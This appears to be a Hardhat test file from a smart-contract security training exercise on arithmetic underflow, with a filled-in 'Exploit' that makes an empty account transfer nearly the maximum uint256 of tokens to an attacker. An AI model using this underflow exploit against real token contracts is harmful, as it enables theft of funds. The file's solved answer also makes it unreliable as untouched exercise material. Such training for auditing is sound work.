import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { expect } from "chai";
import { SimpleToken, SimpleToken__factory } from "../../typechain-types";

describe("Arithmetic Over/Underflow Exercise 2", function () {
    let deployer: SignerWithAddress, attacker: SignerWithAddress, intermediary: SignerWithAddress;

    const ATTACKER1_MINT = parseEther("10");
    const DEPLOYER_MINT = parseEther("100000");
    const MAX_INT = ethers.constants.MaxUint256;

    let token: SimpleToken;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, attacker, intermediary] = await ethers.getSigners();

        // Deploy
        const tokenFactory = (await ethers.getContractFactory(
            "contracts/arithmetic-overflows-2/SimpleToken.sol:SimpleToken",
            deployer
        )) as SimpleToken__factory;
        token = await tokenFactory.deploy();

        await token.mint(deployer.address, DEPLOYER_MINT);
        await token.mint(attacker.address, ATTACKER1_MINT);
    });

    it("Exploit", async function () {
        /** CODE YOUR SOLUTION HERE */
        let userBalance = await token.getBalance(deployer.address);
        await token.connect(intermediary).transfer(attacker.address, MAX_INT.sub(parseEther("1000000")));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker should have a lot of tokens (at least more than 1 million)
        expect(await token.getBalance(attacker.address)).to.be.gt(
            parseEther("1000000")
        );
    });
});
